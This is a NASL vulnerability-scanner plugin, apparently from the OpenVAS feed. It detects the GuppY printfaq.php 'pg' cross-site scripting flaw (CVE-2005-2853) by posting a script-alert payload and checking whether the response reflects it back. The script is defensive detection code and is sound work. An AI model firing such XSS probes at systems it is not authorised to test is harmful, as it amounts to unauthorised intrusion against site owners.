if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.19942" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)" );
	script_cve_id( "CVE-2005-2853" );
	script_bugtraq_id( 14752, 14984 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "GuppY pg Parameter Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2006 Josh Zlatin-Amishav" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "cross_site_scripting.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://archives.neohapsis.com/archives/bugtraq/2005-09/0362.html" );
	script_tag( name: "solution", value: "Upgrade to version 4.5.6a or later." );
	script_tag( name: "summary", value: "The version of Guppy / EasyGuppY installed on the remote host fails to
  sanitize user-supplied input to the 'pg' field in the 'printfaq.php' script." );
	script_tag( name: "impact", value: "An attacker can exploit this flaw to launch cross-site scripting and
  possibly directory traversal attacks against the affected application." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("url_func.inc.sc");
require("misc_func.inc.sc");
vtstrings = get_vt_strings();
xss = "<script>alert('" + vtstrings["lowercase_rand"] + "');</script>";
exss = urlencode( str: xss );
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
host = http_host_name( dont_add_port: TRUE );
if(http_get_has_generic_xss( port: port, host: host )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/printfaq.php?lng=en&pg=1";
	req = http_get( item: url, port: port );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "<title>GuppY - " )){
		postdata = NASLString( "pg=", exss );
		url = dir + "/printfaq.php";
		req = http_post( item: url, port: port, data: postdata );
		res = http_keepalive_send_recv( port: port, data: req );
		if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, xss )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 0 );

